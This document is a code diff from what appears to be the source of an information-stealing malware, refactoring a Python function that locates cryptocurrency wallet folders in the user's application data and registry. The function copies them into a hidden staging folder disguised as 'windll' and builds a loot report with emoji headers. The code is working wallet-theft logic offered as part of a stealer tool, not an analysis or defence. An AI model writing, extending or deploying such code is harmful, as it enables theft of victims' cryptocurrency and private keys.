@@ -16,9 +16,10 @@ from manager.logger import Log
 import shutil
 
 
-def Wallets(data):
+def Wallets():
+    msgInfo = ""
     Log("===========Wallets===========")
-    data.append("\n\n\n**💰Wallets💰**")
+    msgInfo+="\n\n\n**💰Wallets💰**"
     roaming = os.getenv('APPDATA')
     pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll\\Wallets"
 
@@ -45,7 +46,7 @@ def Wallets(data):
     for key, value in directory.items():
         if os.path.exists(value):
             wallets.append(value)
-            data.append(f"\n∟💸{key}")
+            msgInfo+=f"\n∟💸{key}"
 
     for wallet in registry_directory:
         try:
@@ -62,5 +63,5 @@ def Wallets(data):
         for wallet in wallets:
             shutil.copytree(wallet, pathToLogs+"\\"+wallet.split("\\")[-2], False, None, dirs_exist_ok=True)
 
-    return data
+    return msgInfo
 
